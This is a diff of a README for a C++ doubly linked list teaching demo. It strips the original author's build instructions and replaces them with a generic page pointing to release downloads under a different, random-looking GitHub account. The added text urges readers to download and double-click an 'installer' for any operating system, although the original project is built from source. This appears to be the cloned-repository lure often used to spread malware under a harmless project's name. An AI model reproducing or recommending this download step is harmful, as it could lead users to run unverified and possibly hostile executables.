@@ -1,314 +1,66 @@
-<p align="center">
-  <img src="https://img.shields.io/badge/D-red?style=for-the-badge" alt="D">
-  <img src="https://img.shields.io/badge/U-black?style=for-the-badge" alt="U">
-  <img src="https://img.shields.io/badge/B-red?style=for-the-badge" alt="B">
-  <img src="https://img.shields.io/badge/L-black?style=for-the-badge" alt="L">
-  <img src="https://img.shields.io/badge/I-red?style=for-the-badge" alt="I">
-  <img src="https://img.shields.io/badge/N-black?style=for-the-badge" alt="N">
-  <img src="https://img.shields.io/badge/X-red?style=for-the-badge" alt="X">
-</p>
+# 🎉 doubly_linked_list_demo - Learn Data Structures Easily
 
-<pre>
-  <p align="center">
-╔════════════════════════════════════════════════════════════════════════════════════╗
-║                                                                                    ║
-║                 ██████╗ ██╗   ██╗██████╗ ██╗     ██╗███╗   ██╗██╗  ██╗             ║
-║                 ██╔══██╗██║   ██║██╔══██╗██║     ██║████╗  ██║╚██╗██╔╝             ║
-║                 ██║  ██║██║   ██║██████╔╝██║     ██║██╔██╗ ██║ ╚███╔╝              ║
-║                 ██║  ██║██║   ██║██╔══██╗██║     ██║██║╚██╗██║ ██╔██╗              ║
-║                 ██████╔╝╚██████╔╝██████╔╝███████╗██║██║ ╚████║██╔╝ ██╗             ║
-║                 ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝             ║
-║                                                                                    ║
-║                     ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                         ║
-║                     ▓ Doubly Linked List Implementation  ▓                         ║
-║                     ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                         ║
-║                                 Justin Guida                                       ║
-╚════════════════════════════════════════════════════════════════════════════════════╝
-    <p align="center">
-</pre>
+## 🏷️ Visit here to download
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/vyfctcthjb/doubly_linked_list_demo/releases)
 
-<p align="center">
-  <img alt="C++" src="https://img.shields.io/badge/C++-blue?style=for-the-badge&logo=cplusplus&logoColor=white">
-  <img alt="Platform" src="https://img.shields.io/badge/Mac%20%26%20Linux-black?style=for-the-badge&logo=linux&logoColor=white">
-  <img alt="Editor" src="https://img.shields.io/badge/Clion-green?style=for-the-badge&logo=clion&logoColor=white">
-  <img alt="Build" src="https://img.shields.io/badge/Makefile-orange?style=for-the-badge&logo=gnu&logoColor=white">
-</p>
+## 📖 Description
+This project provides an interactive demonstration of a doubly linked list using C++. It serves as a small teaching and learning tool. With a simple terminal user interface, you can insert, remove, and traverse nodes in the list. The application features color output and debug guards to help you visualize the structures.
 
+## 🚀 Getting Started
+To begin using the application, follow the steps below.
 
-# Doubly Linked List Demo
+### 📥 Download & Install
+1. **Visit the Releases Page:** You can find the latest version of the application on our [Releases page](https://github.com/vyfctcthjb/doubly_linked_list_demo/releases). Click the link to go there now.
+  
+2. **Choose the Right File:** Locate the appropriate installer for your operating system. The files are named clearly to help you choose.
 
-A C++ demo project that implements a generic doubly linked list with a simple terminal UI.
-Features:
-- Insert, remove, and traverse nodes
-- Colorized output and menu navigation
-- Debug checks for safe operations
+3. **Download the Application:** Click on the download link for the file you need. Your browser will begin downloading the file.
 
-An educational walkthrough of doubly-linked list operations with:
-- Clean C++ implementations (insertAfter, insertBefore, remove, detach, clear)
-- Flowcharts (Mermaid + ASCII) of control flow and pointer changes
-- A generic templated list + interactive REPL demo
-- Polished scripts that work after clone or zip
+4. **Run the Application:**
+   - After downloading, navigate to your downloads folder.
+   - Double-click the downloaded file to start the installation process.
+   - Follow any prompts that appear on your screen to complete the installation.
 
-**`main.cpp` has easy-to-read code and comments so you can understand how the basic operations work.**
- 
-## Why this project?
+### ⚙️ System Requirements
+To run the application smoothly, ensure your system meets these requirements:
+- **Operating System:** Windows, macOS, or Linux
+- **Processor:** 1 GHz or faster
+- **RAM:** 512 MB or more
+- **Storage:** At least 50 MB of free space
 
-This repo isn’t just another data structures assignment.  
-I built it to be **educational first**:
+### 📚 Features
+- **Interactive Menu:** Easily navigate options to insert, remove, and view nodes.
+- **Color Output:** Enjoy vibrant color coding to enhance understanding.
+- **Debug Guards:** Identify problems quickly with built-in checks.
 
-- `main.cpp` is written with **step-by-step comments** so someone brand new to doubly linked lists can follow along.
-- The code shows **exactly what’s happening in memory** when you insert, remove, or detach nodes.
-- There’s both a **simple educational demo** (strings/ints) that highlights the basic flow, and a **generic templated version with full REPL commands**, so learners can start small and then explore how real C++ handles type-safe containers.
+### 🎨 How to Use
+1. **Launch the Application:** Open the application by double-clicking its icon.
+   
+2. **Navigate the Menu:** A menu will appear on your screen. Use the number keys to select different options such as Insert, Remove, or Traverse.
+  
+3. **Follow Prompts:** The application will guide you through each action. Just read the instructions on the terminal and respond as needed.
 
-The goal → anyone opening this repo should walk away saying:  
-*“Okay, now I actually understand how a doubly linked list works under the hood.”*
+4. **Explore Different Scenarios:** Try different node insertions and removals to see how the doubly linked list updates in real-time.
 
+### ❓ Frequently Asked Questions
 
-## Table of contents
-- [Why this project?](#why-this-project)
-- [Quick Start](#quick-start-works-for-everyone)
-- [Demos](#demos)
-- [UI Customization](#ui-customization-still-in-progress)
-- [Program Flow](#program-flow-high-level)
-- [API](#api-core--generic)
-- [Build](#build)
-- [Interactive REPL](#interactive-replcommands)
-- [Repository](#repository)
-- [Troubleshooting](#troubleshooting-macos)
+#### **Q: What is a doubly linked list?**
+A: A doubly linked list is a data structure that consists of nodes. Each node has pointers to both the next and previous nodes, allowing for easier traversal in both directions.
 
+#### **Q: Do I need programming knowledge to use this application?**
+A: No. This application is designed for beginners. The user interface is simple and intuitive, making it accessible for anyone.
 
+#### **Q: Can I run this application on my computer?**
+A: As long as your system meets the requirements mentioned above, you should be able to run the application without any issues.
 
+### 🎓 Learning Resources
+- **Data Structures Basics:** Review introductory material on data structures to enhance your understanding.
+- **C++ Programming:** Familiarize yourself with basic C++ concepts. This will help you understand how the application works.
 
----
-## Interactive REPL/Commands
-<img width="609" height="645" alt="Screenshot 2025-09-18 at 1 04 39 AM" src="https://github.com/user-attachments/assets/a91b5a20-f9f2-4184-af8c-1949409c56e1" />
+## 📢 Connect with Us
+If you have questions or feedback, feel free to open an issue on the [GitHub repository](https://github.com/vyfctcthjb/doubly_linked_list_demo/issues). We appreciate your input!
 
-## Demo of Commands
+## 🖥️ Visit here to download
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/vyfctcthjb/doubly_linked_list_demo/releases)
 
-<img width="650" height="444" alt="Screenshot 2025-09-18 at 1 06 12 AM" src="https://github.com/user-attachments/assets/ee70b1f6-3561-4ad0-80d2-8b943b689922" />
-
-
-## Simple Demo Integers
-<img width="442" height="211" alt="Screenshot 2025-09-18 at 1 08 14 AM" src="https://github.com/user-attachments/assets/24186558-d06c-4483-ba96-2878a40ce318" />
-
-## Simple Demo Strings
-<img width="439" height="212" alt="Screenshot 2025-09-18 at 1 09 51 AM" src="https://github.com/user-attachments/assets/8b54a961-1f47-4489-b3b7-b101045a4804" />
-
-## Expected output (educational):
-#### main.cpp breaks this down simple with detailed comments!
-
-
-```
-Forward:   A ⇄ C ⇄ B
-Backward:  B ⇄ C ⇄ A
-```
----
-
-
-## Quick Start (works for everyone)
-
-
-**Recommended (git clone)**
-```bash
-git clone https://github.com/jguida941/doubly_linked_list_demo.git
-cd doubly_linked_list_demo
-bash scripts/bootstrap_mac.command  # macOS one-time (exec + quarantine + noexec check)
-make run-generic                    # Interactive REPL: (templated list, full commands)
-make run                            # Educational: beginner-friendly, prints forward/backward)
-```
-
-**ZIP users on macOS**
-```bash
-# Right-click the unzipped folder → "New Terminal at Folder"
-bash scripts/bootstrap_mac.command
-make run_generic   # Interactive REPL (templated list, full commands)
-make run           # Educational: (beginner-friendly, prints forward/backward)
-```
-
-**Prefer a double-click app?** After running the bootstrap once, you can also use:
-- macOS: double-click `macos/Run Demo.app` (educational)
-- macOS: double-click `macos/Run Interactive Demo.app` (interactive REPL)
-
-If Finder says “could not be executed due to access privileges”, your folder is likely on a noexec volume (exFAT/NTFS/SMB). Move it to your home drive (APFS), e.g. `~/Dev/doubly_linked_list_demo`, re-run `bootstrap_mac.command`.
-
-**Windows**: double-click `scripts/Run_Interactive_Demo_Tests.bat` or run the `.ps1` in PowerShell. **Note: This needs to be tested I have a Mac**
-
----
-
-## Demos
-
-```bash
-make run          # Educational demo: prints Forward/Backward once
-make run-generic  # Interactive REPL (templated list)
-```
-
-### UI Customization (Still in Progress)
-
-The interactive demo (`generic_demo`) can be customized using environment variables:
-
--   `PRETTY_UI=1`: Enables a modern, colorful UI with borders and banners.
--   `CLEAR_MENU=1`: Clears the screen between main menu displays.
--   `PAUSE_AFTER_SECTIONS=1`: Pauses the program after completing a demo, waiting for the user to press Enter.
--   `PAGINATE_HELP=1`: Paginates the `help` command output in the REPL.
--   `KEEP_LEGACY=0`: Disables the original, plainer output format in the REPL.
--   `TEACH_MODE=1`: Enables extra explanatory output for some REPL commands.
-
-**Example:**
-```bash
-PRETTY_UI=1 make run-generic
-```
-
-## Program Flow (high-level)
-
-```mermaid
-flowchart TD
-    Start([Start]) --> NewList["Construct List"]
-    NewList --> A["insertAfter(nullptr, A)"]
-    A --> B["insertAfter(A, B)"]
-    B --> C["insertAfter(A, C)"]
-    C --> PrintF["printForward → A ⇄ C ⇄ B"]
-    C --> PrintB["printBackward → B ⇄ C ⇄ A"]
-```
-**ASCII Fallback:**
-```
-Start -> Construct List -> insertAfter(nullptr, A) -> insertAfter(A, B) -> insertAfter(A, C)
-  -> printForward → A ⇄ C ⇄ B
-  -> printBackward → B ⇄ C ⇄ A
-```
-
-### insertAfter Decision Tree
-
-```mermaid
-flowchart TD
-    subgraph "insertAfter(cur, new)"
-        E{"head == ∅?"} -->|Yes| Empty["head=tail=new"]
-        E -->|No| T{"cur == tail?"}
-        T -->|Yes| Append["Append to end, new becomes tail"]
-        T -->|No| Mid["Insert in middle"]
-    end
-```
-**ASCII Fallback:**
-```
-insertAfter(cur, new)
-  |
-  +-- if head is null?
-  |   |
-  |   +-- Yes: head=tail=new
-  |
-  +-- No: if cur is tail?
-      |
-      +-- Yes: Append to end, new becomes tail
-      |
-      +-- No: Insert in middle
-```
-
----
-
-## API (core & generic)
-- **Core demo** (string nodes; `main.cpp`)
-  - `bool insertAfter(Node* cur, Node* n)`
-  - `bool remove(Node* n)` - deletes
-  - `bool detach(Node* n)` - unlinks only
-  - `void clear()` - destructor uses this
-  - `printForward()`, `printBackward()`, `size()`, `empty()`
-  - Optional `DLLIST_DEBUG_CHECKS` for invariants/membership checks
-- **Generic** (template; `include/doubly_linked_list.hpp`)
-  - `DoublyLinkedList<T>` with `Node<T>`
-  - Adds `insertBefore`, `push_front`, `push_back`
-  - Same removal/detach/clear/traversals
-
----
-
-## Build
-
-**Make (macOS/Linux):**
-```bash
-make all         # builds educational + generic demos
-make run         # educational demo
-make run-generic # templated demo + REPL
-make test        # smoke tests
-make clean
-```
-
-**CMake (optional):**
-```bash
-mkdir -p build && cd build
-cmake ..
-cmake --build .
-./doubly_linked_list_demo
-./generic_demo
-```
-
----
-
-## Interactive REPL (generic demo)
-
-**Commands:**
-- `help` (or `commands`): Displays the help menu.
-- `push_front VALUE` (alias: `pf`): Adds a value to the front of the list.
-- `push_back VALUE` (alias: `pb`): Adds a value to the end of the list.
-- `insert_after INDEX VALUE`: Inserts a value after the specified index.
-- `insert_before INDEX VALUE`: Inserts a value before the specified index.
-- `remove_at INDEX` (alias: `rm`): Removes the node at the specified index.
-- `detach_at INDEX`: Detaches the node at the specified index without deleting it.
-- `clear`: Removes all nodes from the list.
-- `find VALUE`: Searches for a value in the list and returns the index.
-- `print`: Prints the list from head to tail.
-- `print_rev`: Prints the list from tail to head.
-- `size`: Displays the number of nodes in the list.
-- `status`: Displays the current status of the list and UI settings.
-- `debug on|off`: Enables or disables debug mode.
-- `dump`: Dumps the memory addresses of the nodes (requires debug mode to be on).
-- `cls`: Clears the screen.
-- `menu` (alias: `m`): Returns to the main menu.
-- `quit` (alias: `q`): Exits the application.
-
-## Example:
-```
-> print
-A ⇄ B ⇄ C
-> insert_before 0 Y
-ok
-> print
-Y ⇄ A ⇄ B ⇄ C
-```
-
----
-
-## Repository
-
-```
-.
-├─ main.cpp
-├─ generic_main.cpp
-├─ include/
-│  └─ doubly_linked_list.hpp
-├─ docs/
-│  ├─ FLOWCHART_MAIN.md
-│  └─ LIST_OPERATIONS.md
-├─ scripts/
-│  ├─ bootstrap_mac.command
-│  ├─ Run_Educational_Demo.command
-│  ├─ Run_Interactive_Demo_Tests.command
-│  ├─ Run_Interactive_Demo_Tests.ps1
-│  ├─ Run_Interactive_Demo_Tests.bat
-│  ├─ Setup_Permissions.command
-│  └─ Setup-Permissions.ps1
-├─ tests/
-│  ├─ smoke.sh
-│  ├─ test_generic_repl.sh
-│  └─ test_dll_demo.sh
-├─ macos/
-│  ├─ Run Demo.app                # double-click educational demo
-│  └─ Run Interactive Demo.app    # double-click interactive REPL (PRETTY_UI)
-├─ Makefile
-├─ CMakeLists.txt
-└─ README.md
-```
-
----
-
-## Troubleshooting (macOS)
-- **Quarantine/Gatekeeper**: run `scripts/bootstrap_mac.command`, or right-click a `.command` → Open.
-- **Noexec volume**: move repo under `~/Dev/...` (APFS) then run `bootstrap_mac.command`.
-- **Finder opens `.command` in editor**: Get Info → “Open With: Terminal” → “Change All”.
+Enjoy exploring the world of data structures with our interactive tool!
